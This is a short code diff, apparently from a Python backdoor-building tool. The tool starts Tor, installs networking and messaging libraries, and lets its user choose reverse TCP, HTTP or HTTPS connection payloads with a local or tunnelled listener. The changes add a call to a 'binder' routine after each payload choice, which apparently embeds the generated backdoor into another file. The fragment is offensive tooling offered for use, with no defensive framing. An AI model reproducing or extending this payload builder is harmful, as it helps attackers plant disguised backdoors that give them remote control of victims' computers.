@@ -23,7 +23,7 @@ try:
     os.system('service postgresql start && service tor start')
 
 except ImportError:
-    os.system('pip install colorama twilio flask env paramiko freeze SocksiPy-branch email mime smtp2go')
+    os.system('pip install colorama twilio flask env paramiko freeze SocksiPy-branch email smtp2go')
     pass
 
 
@@ -241,6 +241,7 @@ class atj:
                     subprocess.call(
                         'echo "reverse_tcp" > ' + atj.tmp + 'protocol.txt',
                         shell=True)
+                    atj.binder(self="")
                 elif HOST == "2":
                     NGHOST = "127.0.0.1"
                     NGPORT = raw_input("\t[i] NHOST: {0}"
@@ -297,6 +298,7 @@ class atj:
                     subprocess.call(
                         'echo "reverse_http" > ' + atj.tmp + 'protocol.txt',
                         shell=True)
+                    atj.binder(self="")
                 elif HOST == "2":
                     NGHOST = "127.0.0.1"
                     NGPORT = raw_input("\t[i] NHOST: {0}"
@@ -353,6 +355,7 @@ class atj:
                     subprocess.call(
                         'echo "reverse_https" > ' + atj.tmp + 'protocol.txt',
                         shell=True)
+                    atj.binder(self="")
                 elif HOST == "2":
                     NGHOST = "127.0.0.1"
                     NGPORT = raw_input("\t[i] NHOST: {0}"
